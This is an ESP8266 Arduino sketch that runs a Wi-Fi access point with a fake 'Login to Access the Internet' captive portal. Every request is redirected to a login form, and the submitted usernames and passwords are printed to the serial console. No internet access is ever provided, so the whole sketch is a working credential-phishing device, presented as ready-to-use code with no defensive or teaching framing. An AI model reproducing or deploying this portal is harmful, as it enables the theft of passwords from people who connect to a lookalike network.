#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* ssid = "NodeMCU"; // Change this to your desired network name
const char* password = "password"; // Change this to your desired network password

ESP8266WebServer server(80);

int numClients = 0; // Number of clients connected to the access point

void handleRoot() {
  server.sendHeader("Location", "/login");
  server.send(302, "text/plain", "");
}

void handleLogin() {
  if (server.hasArg("username") && server.hasArg("password")) {
    String enteredUsername = server.arg("username");
    String enteredPassword = server.arg("password");
    Serial.print("Entered username: ");
    Serial.println(enteredUsername);
    Serial.print("Entered password: ");
    Serial.println(enteredPassword);
  }
  String html = "<!DOCTYPE html><html><head><title>Login Page</title><style>body{background-color:#f2f2f2;font-family:Arial,Helvetica,sans-serif;}form{border:3px solid #f1f1f1;margin:8% 25%;padding:20px;background-color:white;}input[type=text],input[type=password]{width:100%;padding:12px 20px;margin:8px 0;display:inline-block;border:1px solid #ccc;box-sizing:border-box;}button{background-color:#4CAF50;color:white;padding:14px 20px;margin:8px 0;border:none;cursor:pointer;width:100%;}</style></head><body><form method='post' action='/login'><h2>Login to Access the Internet</h2><label for='username'><b>Username</b></label><input type='text' placeholder='Enter Username' name='username' required><label for='password'><b>Password</b></label><input type='password' placeholder='Enter Password' name='password' required><button type='submit'>Login</button></form></body></html>";
  server.send(200, "text/html", html);
}

void handleDisconnect() {
  Serial.println("Client disconnected");
  numClients--; // Decrease the number of clients when a client disconnects
}

void setup() {
  WiFi.softAP(ssid, password); // Set up access point
  IPAddress IP = WiFi.softAPIP(); // Get IP address of the access point
  Serial.begin(115200);
  delay(10);
  Serial.println();
  Serial.print("AP IP address: ");
  Serial.println(IP);
  server.on("/", handleRoot);
  server.on("/login", handleLogin);
  server.onNotFound(handleRoot);
  server.begin();
  pinMode(LED_BUILTIN, OUTPUT); // Set up built-in LED
  digitalWrite(LED_BUILTIN, LOW); // Turn off the LED
}

void loop() {
  server.handleClient();
  int currentClients = WiFi.softAPgetStationNum(); // Get the number of connected clients
  if (currentClients != numClients) {
    Serial.print("Number of clients connected: ");
    Serial.println(currentClients);
    numClients = currentClients;
    digitalWrite(LED_BUILTIN, HIGH); // Flash the LED when a new client connects
    delay(500);
    digitalWrite(LED_BUILTIN, LOW);
  }
}
